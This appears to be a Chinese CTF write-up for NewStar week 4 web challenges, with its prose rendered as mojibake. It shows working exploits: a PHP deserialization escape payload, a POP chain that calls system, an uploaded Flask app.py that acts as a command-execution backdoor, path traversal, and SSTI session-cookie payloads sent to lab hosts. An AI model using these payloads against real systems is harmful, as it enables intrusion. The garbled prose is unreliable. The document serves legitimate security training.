## å‰è¨€

```java
Newstarç¬¬å››å‘¨æœ€åä¸€å‘¨ï¼Œèµ¶ç´§æ¶¦æ¥çœ‹çœ‹é¢˜
```

## é€ƒ

```java
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}

unserialize(waf(serialize(new GetFlag($_GET['key'])))); 
```

```java
å­—ç¬¦çš„å˜åŒ– å°‘->å¤šè‚¯å®šæ˜¯å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä½†æ˜¯æˆ‘çš„è„‘ç“œå­åšè¿™ç§é¢˜å°±å¾ˆè’™
O:7:"GetFlag":2:{s:3:"key";s:81:"27ä¸ªgood";s:3:"cmd";s:7:"cat /f*";}    
å…¶å®å°‘->å¤šå°±æ˜¯è¦†ç›–å…¨éƒ¨çš„å­—ç¬¦
   
```

O:7:"GetFlag":2:{s:3:"key";s:105:"`badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}`";s:3:"cmd";s:6:"whoami";}

çº¢è‰²åŒ…å›´çš„æ˜¯105ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯wafåå°±ä¼šå˜ä¸º

O:7:"GetFlag":2:{s:3:"key";s:105:"`27ä¸ª good`";s:3:"cmd";s:7:"cat /f*";}   `åé¢åˆ°äº†å‰é¢çš„}å°±ä¼šç»“æŸ`";s:3:"cmd";s:6:"whoami";}

å¤§è‡´å°±æ˜¯è¿™æ ·ï¼Œæ‰€ä»¥åªç”¨ç®—å‡º ";s:3:"cmd";s:7:"cat /f*";} å³å¯æœ‰å¤šå°‘ä¸ªï¼Œå°±æœ‰å¤šå°‘ä¸ªbad

##### ç„¶åå‘ç°å‘ç°ä¸€ä¸ª`trick`

```java
  å…¶ä¸­Så¿…é¡»å¤§å†™æ‰ä¼šå­˜åœ¨16è¿›åˆ¶,flag.phpï¼Œå¯ä»¥ç”¨16è¿›åˆ¶ç»•è¿‡
    'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'
```

```jav
key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad%22;s:3:%22cmd%22;s:7:%22cat%20/f*%22;}
```

## More Fast

```java
<?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}

class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}

class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}

$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
```

å‘ƒå‘ƒå‘ƒä¸€çœ¼GCå›æ”¶æœºåˆ¶ï¼Œ

 ($this->func)($this->var);  è¿™é‡Œç›´æ¥å–åå‘ç°æ²¡æˆåŠŸã€‚ã€‚ã€‚ã€‚qaq

ç›´æ¥systemå°±å¯ä»¥ï¼Œå‘ƒå‘ƒå‘ƒæœ¬åœ°ä¸€ç›´æ‹¬å·æŠ¥é”™ï¼Œè€½è¯¯æ—¶é—´äº†ã€‚ã€‚ã€‚

![image-20231023135759520](..\img\final\image-20231023135759520.png)

```java
$S=new Start();
$S->errMsg=new Crypto();

$S->errMsg->obj=new Reverse();
$S->errMsg->obj->func=new Pwn();
$S->errMsg->obj->func->obj=new Web();
$S->errMsg->obj->func->obj->func="system";

$S->errMsg->obj->func->obj->var="cat /f*";

$a=array(0=>$S,1=>3);

//a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:19:"~%8C%86%8C%8B%9A%92";s:3:"var";s:7:"~%93%8C";}}}}}i:0;i:3;}
echo serialize($a);
```

## flask disk

å¯ä»¥çœ‹åˆ°è¿™é“é¢˜ç®€å•çš„ä¸‰ä¸ªåŠŸèƒ½

![image-20231030130310077](..\img\final\image-20231030130310077.png)

admin manageæ˜¯ä¸€ä¸ªconsoleï¼Œè¯´æ˜éœ€è¦flaskç®—pinç ï¼Œæœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œå‘ç°äº†é¢˜ç›®ç»™çš„app.pyè·¯å¾„ï¼Œ

æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦è·å–app.pyçš„æºä»£ç 

![image-20231030130627874](..\img\final\image-20231030130627874.png)

è¿™ä¸ªæ€è·¯ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦

```java
è®¿é—®admin manageå‘ç°è¦è¾“å…¥pinç ï¼Œè¯´æ˜flaskå¼€å¯äº†debugæ¨¡å¼ã€‚flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚æ³¨æ„è¯­æ³•ä¸èƒ½å‡ºé”™ï¼Œå¦åˆ™ä¼šå´©æºƒã€‚
```

```python
from flask import Flask,request
import os
app=Flask(__name__)
@app.route('/')
def index():
    try:
        cmd=request.args.get('cmd')
        data=os.popen(cmd).read()
        return data
    except:
        pass
    return "1"
if __name__=='__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

ç›´æ¥ä¼ ä¸Šå»å³å¯ï¼Œ

![image-20231030132827703](..\img\final\image-20231030132827703.png)

## InjectMe

ç»™äº†ä¸€ä¸ªdockerfileé™„ä»¶

```jav
FROM vulhub/flask:1.1.1
ENV FLAG=flag{not_here}
COPY src/ /app
RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
CMD [ "/start.sh" ]
EXPOSE 8080
```

è·å¾—ä¿¡æ¯ï¼šéƒ½åœ¨app/ç›®å½•ä¸‹é¢,è‚¯å®šæœ‰app.py

çœ‹åˆ°è¿™å¼ å›¾ç»™äº†æºç ï¼Œç”¨çš„æ›¿æ¢è€Œä¸”ä¸æ˜¯å¾ªç¯ï¼Œç›´æ¥åŒå†™ç»•è¿‡ ..././

![image-20231030133031326](..\img\final\image-20231030133031326.png)

http://5d20220e-7610-4db3-8bae-f22ae230a3df.node4.buuoj.cn:81/download?file=..././..././..././..././..././..././app/app.py

```java
import os
import re

from flask import Flask, render_template, request, abort, send_file, session, render_template_string
from config import secret_key

app = Flask(__name__)
app.secret_key = secret_key


@app.route('/')
def hello_world():  # put application's code here
    return render_template('index.html')


@app.route("/cancanneed", methods=["GET"])
def cancanneed():
    all_filename = os.listdir('./static/img/')
    filename = request.args.get('file', '')
    if filename:
        return render_template('img.html', filename=filename, all_filename=all_filename)
    else:
        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"


@app.route("/download", methods=["GET"])
def download():
    filename = request.args.get('file', '')
    if filename:
        filename = filename.replace('../', '')
        filename = os.path.join('static/img/', filename)
        print(filename)
        if (os.path.exists(filename)) and ("start" not in filename):
            return send_file(filename)
        else:
            abort(500)
    else:
        abort(404)


@app.route('/backdoor', methods=["GET"])
def backdoor():
    try:
        print(session.get("user"))
        if session.get("user") is None:
            session['user'] = "guest"
        name = session.get("user")
        if re.findall(
                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
                name):
            abort(500)
        else:
            return render_template_string(
                'ç«Ÿç„¶ç»™<h1>%s</h1>ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ <br> é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!<br> æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜' % name)
    except Exception:
        abort(500)


@app.errorhandler(404)
def page_not_find(e):
    return render_template('404.html'), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    app.run('0.0.0.0', port=8080)
```

```java
import subprocess

import requests
import os
secret_key="y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
payload="{%print(\"\"[\"\137\137\143\154\141\163\163\137\137\"][\"\137\137\155\162\157\137\137\"][1][\"\137\137\163\165\142\143\154\141\163\163\145\163\137\137\"]())%}"


command = "python flask_session_cookie_manager3.py encode -s \"{0}\" -t \"{{'user':'{1}'}}\"".format(secret_key,payload)
print(command)
session_data = subprocess.check_output(command, shell=True)
print(session_data)
session_data = session_data[:-2].decode('utf-8')
print(session_data)

url = "http://a77b9424-fb9a-460c-ae14-1c5be4378cb7.node4.buuoj.cn:81/backdoor"
cookies = {"session": session_data}
res = requests.get(url=url, cookies=cookies)
print(res.text)
```

æˆ‘è¿™é‡Œä¹Ÿæ˜¯8è¿›åˆ¶ç»•è¿‡å‘€ä¸ºå•¥ä¸è¡ŒæŠ¥é”™500

keyåœ¨ /etc/config.pyé€šè¿‡çœ‹dockerfileå¯ä»¥æ¨æ–­å‡ºæ¥

æœ€åè¿˜æ˜¯é å®˜æ–¹wpæå®šï¼Œå‘ƒå‘ƒå‘ƒçœ‹äº†ä¸€ä¸‹å…«æˆæ˜¯\è½¬ä¹‰å­—ç¬¦çš„é—®é¢˜ï¼Œæ‰“äº†ä¸€ä¸‹ctfshowçš„é¶åœºå¯ä»¥æ‰“é€š

```java
payload = "{{%print(xxx|attr(\"\"\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\145\\\\166\\\\141\\\\154\"\")({0}))%}}".format(eval_shell)

```

è¿™é‡Œå¤–é¢ä¸€å±‚çš„{}å…¶å®æ˜¯jsoné‚£ä¸ªç”Ÿæˆsessionçš„

![image-20231030210447711](..\img\final\image-20231030210447711.png)
